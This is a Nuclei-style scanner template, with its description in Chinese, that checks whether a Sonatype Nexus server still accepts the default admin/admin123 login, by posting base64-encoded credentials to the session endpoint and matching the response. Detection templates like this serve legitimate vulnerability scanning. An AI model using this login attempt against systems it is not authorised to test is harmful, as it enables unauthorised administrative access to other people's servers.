id: nexus-default-login

info:
  name: Nexus 默认口令登录（弱口令）
  author: pikpikcu
  severity: high
  description: 该模板通过尝试 Nexus 的默认管理员账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者通常可直接获得后台管理权限，进一步访问敏感信息、修改配置或执行未授权操作。
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
    cvss-score: 8.3
    cwe-id: CWE-522
  metadata:
    max-request: 1
  tags: nexus,default-login,vuln

http:
  - raw:
      - |
        POST /service/rapture/session HTTP/1.1
        Host: {{Hostname}}
        X-Nexus-UI: true
        Content-Type: application/x-www-form-urlencoded; charset=UTF-8

        username={{base64(username)}}&password={{base64(password)}}

    payloads:
      username:
        - admin
      password:
        - admin123
    attack: pitchfork

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 204

      - type: word
        words:
          - "Server: Nexus"
          - "NXSESSIONID"
        part: header
        condition: and
